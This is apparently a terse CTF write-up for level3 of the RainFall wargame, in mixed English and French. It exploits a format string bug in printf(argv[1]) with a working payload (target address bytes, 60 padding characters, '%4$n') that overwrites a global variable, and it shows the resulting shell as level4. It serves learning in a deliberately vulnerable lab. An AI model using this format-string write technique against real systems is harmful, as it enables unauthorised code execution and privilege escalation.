
0x0804988c --> \x8c\x98\x04\x08
0804988c --> location of m -> 4
||| --> 64 to write so we have to write 60 |
%4 --> offset

||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
0804988c
\x8c\x98\x04\x08||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||%4$n%x

addres$ns%
format string vulnerability

```bash
(python -c 'print ("\x8c\x98\x04\x08" + "|" * 60 + "%4$n")'; cat) | ./level3
```

printf(argv[1]);

printf("%x %x %x %x");


--------------------------------------

## Payload

Addresse cible \x8c\x98\x04\x08 + 
number of character to write (= value to overwrite addresse cible - 4 because address itself is 4 characters) +
"%4$n" (%n -> write in memory, 4$ --> jump 4eme emplacement = debut du buffer car char* = 4 bytes en 32bits)

`(python -c 'print ("\x8c\x98\x04\x08" + "|" * 60 + "%4$n")'; cat) | ./level3`

```console
level3@RainFall:~$ (python -c 'print ("\x8c\x98\x04\x08"+"|" * 60 + "%4$n")'; cat) | ./level3
�||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
Wait what?!
whoami
level4
```